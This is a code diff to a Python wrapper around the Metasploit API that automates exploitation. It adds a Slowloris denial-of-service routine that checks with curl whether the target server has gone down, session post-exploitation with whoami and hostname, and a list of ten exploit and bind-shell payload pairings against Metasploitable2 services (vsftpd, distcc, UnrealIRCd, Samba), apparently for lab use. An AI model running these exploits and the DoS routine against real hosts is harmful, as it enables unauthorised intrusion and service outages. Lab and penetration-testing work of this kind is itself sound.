@@ -1,9 +1,8 @@
 import re
 import time
 import socket
-from icmplib import ping
 
-from metasploit.api.connections import Metasploit
+from metasploit.api.connections import Metasploit, SSH
 from requests.adapters import ConnectionError
 from metasploit.api.errors import (
     MsfrpcdConnectionError,
@@ -15,8 +14,11 @@ from metasploit.api.utils.rest_api_utils import HttpCodes
 from metasploit.api.errors import (
     MetasploitActionError
 )
-from metasploit.api.response import payload_info_response, exploit_info_response
+from metasploit.api.response import payload_info_response, exploit_info_response, auxiliary_info_response
 from metasploit.api.utils.helpers import TimeoutSampler
+import logging
+
+logger = logging.getLogger(__name__)
 
 
 def metasploit_action_verification(func):
@@ -59,8 +61,10 @@ class MetasploitModule(object):
         try:
             if target:
                 self._target_host = socket.gethostbyname(target)
-                is_target_reachable = ping(address=self._target_host, privileged=False).is_alive
-                if not is_target_reachable:
+                self._ssh = SSH(hostname=source_host)
+                ping_cmd = f"ping -c3 {self._target_host}"
+                is_ping_success, _ = self._ssh.execute_commands(commands=[ping_cmd])
+                if not is_ping_success:
                     raise HostIsUnreachable(source_host=self._source_host, target_host=self._target_host)
         except socket.gaierror:
             raise InvalidHostName(invalid_host=target)
@@ -140,8 +144,20 @@ class MetasploitModule(object):
             job_details = self._metasploit.metasploit_client.jobs.info(jobid=job_id)
             if "error" not in job_details:
                 return job_details
-            return {}
         return {}
+
+    def stop_job(self, job_id):
+        """
+        Stops a job performed by metasploit.
+
+        Args:
+            job_id (int): job ID.
+
+        Returns:
+            bool: True if job was stopped successfully, False otherwise.
+        """
+        self._metasploit.metasploit_client.jobs.stop(jobid=job_id)
+        return True if str(job_id) not in self._metasploit.metasploit_client.jobs.list else False
 
     def build_module(self, name, options, type='payload'):
         """
@@ -236,11 +252,16 @@ class Exploit(MetasploitModule):
         ]
         """
         exploit = self.build_module(name=name, options=options, type=self.type)
+        # logger.info(f"exploit name: {exploit.name}")
+        # logger.info(f"exploit RHOSTS: {exploit['RHOSTS']}")
         successful_payloads = []
 
         for payload_name, payload_options in payloads.items():
             payload = self.build_module(name=payload_name, options=payload_options)
+            # logger.info(f"key: {payload_name}")
+            # logger.info(f"value: {payload_options}")
             exploit_job = exploit.execute(payload=payload)
+            # logger.info(f"exploit job {exploit_job}")
             job_id = exploit_job["job_id"]
 
             time.sleep(7)
@@ -266,6 +287,7 @@ class Exploit(MetasploitModule):
         """
         payload_details = {}
         commands = ["hostname", "whoami"]
+        # logger.info(f"sessions: {self._metasploit.metasploit_client.sessions.list}")
 
         for session_id, session_details in self._metasploit.metasploit_client.sessions.list.items():
             if exploit_name in session_details['via_exploit'] and payload_name in session_details['via_payload']:
@@ -275,10 +297,12 @@ class Exploit(MetasploitModule):
                     payload_details[cmd] = output
 
         job_details = self.job_info(job_id=job_id)
+        # logger.info(f"Job details: {self._metasploit.metasploit_client.jobs.info(jobid=str(job_id))}")
         if job_details:
             payload_details["job"] = job_details
         if payload_details:
             payload_details["target"] = self._target_host
+            payload_details['success'] = True
         return payload_details
 
     @metasploit_action_verification
@@ -442,3 +466,193 @@ class PortScanning(MetasploitModule):
             open_ports += re.findall(pattern=finding_port_pattern, string=data)
 
         return open_ports
+
+
+class Auxiliary(MetasploitModule):
+
+    type = 'auxiliary'
+
+    def info(self, auxiliary_name):
+        """
+        Gets information about an auxiliary.
+
+        Args:
+            auxiliary_name (str): auxiliary name.
+
+        Returns:
+            dict: information about the auxiliary.
+        """
+        auxiliary_name = auxiliary_name.replace(" ", "/")
+        auxiliary = super().init_module(module_name=auxiliary_name, module_type=self.type)
+
+        return auxiliary_info_response(auxiliary=auxiliary)
+
+    def execute(self, *args, **kwargs):
+        """
+        Executes an auxiliary module.
+        """
+        if kwargs.pop("dos_slowris", None):
+            return self.dos_slowris(**kwargs)
+
+    def dos_slowris(self, name, options, min_timeout=3, max_timeout=5, wait_for_server_timeout=30, sleep=5):
+        """
+        Executes slowris dos attack on a target host (web server).
+
+        Args:
+            name (str): type of slowris attack to use.
+            options (dict): slowris attack options.
+            min_timeout (int): min timeout to get the curl response in seconds.
+            max_timeout (int): max timeout to get the curl response in seconds.
+            wait_for_server_timeout (int): timeout to wait for attacked server to return back to live or crash.
+            sleep (int): sleep sampling between each execution of curl command.
+
+        Returns:
+            dict: response indicating about success or failure of the dos attack.
+
+        Examples:
+
+            {
+                "curl --connect-timeout 3 --max-time 5 172.17.0.3":
+                {
+                    "curl_output": "curl: (28) Operation timed out after 5000 milliseconds with 0 bytes received\n",
+                    "curl_status_code": 28
+                },
+            "success": true
+            }
+        """
+        is_slowris_success_cmd = f"curl --connect-timeout {min_timeout} --max-time {max_timeout} {self._target_host}"
+        auxiliary = self.build_module(name=name, options=options, type=self.type)
+        job = auxiliary.execute()
+
+        result = {}
+
+        job_id = job['job_id']
+        job_info = self.job_info(job_id=job_id)
+        if job_info:
+
+            try:
+
+                for is_success, commands in TimeoutSampler(
+                    timeout=wait_for_server_timeout,
+                    sleep=sleep,
+                    func=self._ssh.execute_commands,
+                    commands=[is_slowris_success_cmd]
+                ):
+                    if not is_success:  # means we managed to make server crash
+
+                        slowries_cmd_command_res = commands[0]
+                        all_lines = [line for line in slowries_cmd_command_res[is_slowris_success_cmd][2]]
+                        result['success'] = True
+                        info = {
+                            "curl_status_code": slowries_cmd_command_res[is_slowris_success_cmd][0],
+                            "curl_output": all_lines[-1]
+                        }
+                        result[is_slowris_success_cmd] = info
+                        break
+
+                if not self.stop_job(job_id=job_id):
+                    raise MetasploitActionError(
+                        error_msg=f"unable to stop job {job_info}", error_code=HttpCodes.INTERNAL_SERVER_ERROR
+                    )
+
+            except TimeoutExpiredError:
+                pass
+
+        return result if result else {"success": False}
+
+
+"""
+Working exploits on metasploitable2
+
+1)
+{
+    "name": "unix/ftp/vsftpd_234_backdoor",
+    "payloads": {
+        "cmd/unix/interact": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }          
+}
+
+2)
+{
+    "name": "unix/misc/distcc_exec",
+    "payloads": {
+        "cmd/unix/bind_perl": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }          
+}
+
+3)
+{
+    "name": "unix/irc/unreal_ircd_3281_backdoor",
+    "payloads": {
+        "cmd/unix/bind_perl": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }          
+}
+
+4)
+ "name": "unix/irc/unreal_ircd_3281_backdoor",
+    "payloads": {
+        "payload/cmd/unix/bind_ruby": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }    
+
+5)
+"name": "unix/irc/unreal_ircd_3281_backdoor",
+    "payloads": {
+        "cmd/unix/bind_ruby_ipv6": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+6)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_awk": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+7)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_busybox_telnetd": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }   
+8)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_inetd": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }
+9)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_lua": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }       
+10)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_jjs": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }   
+
+"""
